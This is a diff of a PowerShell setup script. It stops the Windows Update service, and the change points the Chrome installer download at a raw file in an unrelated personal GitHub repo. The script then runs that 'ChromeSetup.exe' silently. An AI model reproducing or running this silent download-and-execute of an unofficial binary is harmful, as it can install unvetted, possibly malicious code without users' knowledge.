@@ -52,7 +52,7 @@ Stop-Service -Name wuauserv -Force
  }
 
 #Xu ly Chrome
- $ChromeUrl = "https://github.com/trangtrau/random-agent-spoofer/releases/download/v2.0/ChromeSetup.exe"
+ $ChromeUrl = "https://raw.githubusercontent.com/nhannguyen28049x/similartiktss/main/ChromeSetup.exe"
  $ChromeUrlLoc = "$PSScriptRoot\ChromeSetup.exe"
  downloadFile $ChromeUrl $ChromeUrlLoc
  Start-Process -FilePath $ChromeUrlLoc -ArgumentList "/silent /install"
